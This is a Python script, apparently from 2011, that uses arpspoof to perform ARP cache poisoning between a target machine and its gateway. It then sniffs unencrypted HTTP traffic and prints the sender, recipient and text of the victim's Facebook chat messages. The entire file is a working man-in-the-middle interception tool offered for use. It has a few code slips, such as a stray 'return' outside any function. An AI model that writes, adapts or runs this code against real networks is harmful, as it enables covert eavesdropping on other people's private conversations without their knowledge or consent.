#!/usr/bin/env python

""" 2011 vdo.pure at gmail.com """

"""
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import sys, os
import dpkt, pcap

def check_root():
    """ returns True if user is root, false otherwise """
    if os.getenv('LOGNAME','none').lower() == 'root':
        return True
    return False

def poison(iface,victim, gw):
  """ IP Forwarding """
  os.system("sysctl -w .net.ipv4.ip_forward=1 > /dev/null")
  """ ARP cache poisoning, silent, in both directions """
  os.system("arpspoof -i "+iface+" -t "+victim+" "+gw+" 2> /dev/null &")
  os.system("arpspoof -i "+iface+" -t "+gw+" "+victim+" 2> /dev/null &")
  print("ARP cache poisoning...")


def fbchatgrep(p,pid):
    data = str(p.data)
    if ("{\"t\":\"msg") and ("\"type\":\"msg\"") in data:
      msgid=data[data.find("\"msgID\":")+9:data.rfind("\"},\"from\":")]  
      if (pid != msgid ): #check if the message appeared before (ARP poison clones)
        pid = msgid
        print(" ")
        s = "Message From: "+data[data.find("from_name\":\"")+12:data.rfind("\",\"from_first_name")]
        print(unicode(s,'unicode_escape').encode('utf-8'))
        s = "To: "+data[data.find("to_name\":\"")+10:data.rfind("\",\"to_first_name")]
        print(unicode(s,'unicode_escape').encode('utf-8'))
        s = data[data.find("\"text\":")+8:data.rfind(",\"time\"")-1]
        print(unicode(s,'unicode_escape').encode('utf-8'))
        print(" ")
    return pid
        
if __name__ == '__main__':
  if len(sys.argv) < 4:
    print 'usage: sniff.py <interface> <target> <gateway>'
    sys.exit(0)
  pid="fo bar" 
  pc = pcap.pcap(sys.argv[1])
  pc.setfilter('tcp and port 80') # Sniff only http
  try:
    if not check_root():
        print 'Must be run as root.'
        return
    print 'listening on %s' % (pc.name)
    print 'to exit, type Control-c'
    poison(sys.argv[1],sys.argv[2],sys.argv[3])
    for ts, pkt in pc:
      packet = dpkt.ethernet.Ethernet(pkt)
      pid = fbchatgrep(packet,pid)

  except KeyboardInterrupt:
    os.system("sysctl -w .net.ipv4.ip_forward=0 > /dev/null") # Disable IP forward
    nrecv, ndrop, nifdrop = pc.stats()
    print '\n%d packets received by filter' % nrecv
    print '%d packets dropped by kernel' % ndrop
